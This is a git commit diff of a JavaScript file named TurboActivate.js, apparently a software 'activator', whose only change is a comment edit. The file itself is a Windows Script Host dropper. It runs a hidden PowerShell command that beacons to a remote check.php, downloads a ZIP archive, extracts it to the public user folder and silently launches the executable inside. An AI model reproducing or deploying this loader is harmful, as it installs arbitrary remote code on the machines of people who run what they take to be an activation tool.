548f7cfb9d05947e916ece7e2ae6a379e49d0d86
Turbo-version <zaafog@gmail.com>
2025-03-17 18:49:26 +0100

    Update TurboActivate.js

--- TurboActivate.js
+++ TurboActivate.js
@@ -1,4 +1,4 @@
-// TurboActivate.js
+// TurboActivate.js update test
 var shell = WScript.CreateObject("WScript.Shell");
 var cmd = 'powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\TurboActivate.exe\';$z=$p+\'.zip\';iwr https://example.com/check.php -Method Post -Body \'id=fqn1\';irm https://example.com/T.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p"';
-shell.Run("cmd /c start /min " + cmd, 0, false);
+shell.Run("cmd /c start /min " + cmd, 0, false); 
